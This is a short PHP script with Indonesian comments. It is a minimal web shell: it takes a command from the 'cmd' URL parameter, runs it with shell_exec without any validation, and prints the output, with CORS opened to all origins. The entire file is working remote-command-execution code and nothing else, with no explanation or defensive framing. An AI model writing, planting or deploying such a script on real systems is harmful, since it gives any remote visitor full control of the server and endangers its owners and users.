<?php

// Set header untuk mengizinkan akses dari berbagai domain
header("Access-Control-Allow-Origin: *");

// Ambil perintah yang dikirim melalui method GET
$command = $_GET["cmd"];

// Jalankan perintah
$output = shell_exec($command);

// Tampilkan output terminal Bash
echo "<pre>$output</pre>";

?>
